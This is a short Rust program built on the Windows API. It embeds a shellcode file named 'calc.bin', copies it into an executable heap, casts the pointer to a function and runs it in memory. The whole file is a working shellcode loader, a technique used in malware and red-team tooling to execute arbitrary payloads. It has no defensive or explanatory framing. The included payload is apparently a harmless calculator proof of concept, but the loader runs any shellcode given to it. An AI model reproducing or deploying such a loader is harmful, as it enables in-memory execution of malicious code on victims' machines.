use std::mem::transmute;
use winapi::ctypes::c_void;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::heapapi::HeapAlloc;
use winapi::um::heapapi::HeapCreate;

fn main() {
    let buffer = include_bytes!("..\\..\\calc.bin");

    unsafe {
        let heap = HeapCreate(0x40000, 0, 0);
        let ptr = HeapAlloc(heap, 8, buffer.len());

        if GetLastError() == 0 {
            std::ptr::copy(buffer.as_ptr() as *const u8, ptr as *mut u8, buffer.len());
            let exec = transmute::<*mut c_void, fn()>(ptr);
            exec();
        }
    }
}
